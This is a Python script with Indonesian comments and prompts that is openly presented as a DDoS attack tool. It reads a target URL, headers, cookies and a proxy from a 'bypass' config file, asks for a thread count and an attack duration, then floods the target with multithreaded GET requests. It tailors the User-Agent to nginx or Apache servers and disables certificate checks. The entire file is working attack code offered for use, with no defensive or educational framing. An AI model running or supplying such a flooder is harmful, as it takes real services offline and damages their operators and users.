import requests
import threading
import json
import time

# Membaca konfigurasi dari file JSON
with open("bypass_config.json", "r") as file:
    config = json.load(file)

url = config["url"]
headers = config["headers"]
cookies = config["cookies"]
proxy = config.get("proxy", None)
server_type = config.get("server_type", "Tidak Terdeteksi")

# Prompt untuk jumlah thread dan durasi waktu serangan
num_threads = int(input("Masukkan jumlah thread untuk serangan DDoS: "))
attack_duration = int(input("Masukkan durasi waktu serangan dalam detik: "))

# Fungsi untuk menjalankan serangan DDoS menggunakan konfigurasi yang berhasil
def perform_ddos_attack():
    end_time = time.time() + attack_duration  # Waktu akhir serangan

    def send_request():
        while time.time() < end_time:
            try:
                # Menyesuaikan header atau logika serangan berdasarkan jenis server
                if server_type.lower() == "nginx":
                    headers["User-Agent"] = "Mozilla/5.0 (compatible; NginxBot/1.0)"
                elif server_type.lower() == "apache":
                    headers["User-Agent"] = "Mozilla/5.0 (compatible; ApacheBot/1.0)"
                
                # Mengirim permintaan dengan header, cookies, dan proxy yang ditentukan
                response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, verify=False)
                print(f"Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"API tidak merespon: {e}")

    # Mulai serangan DDoS dengan jumlah thread yang ditentukan
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()

# Jalankan serangan DDoS
perform_ddos_attack()
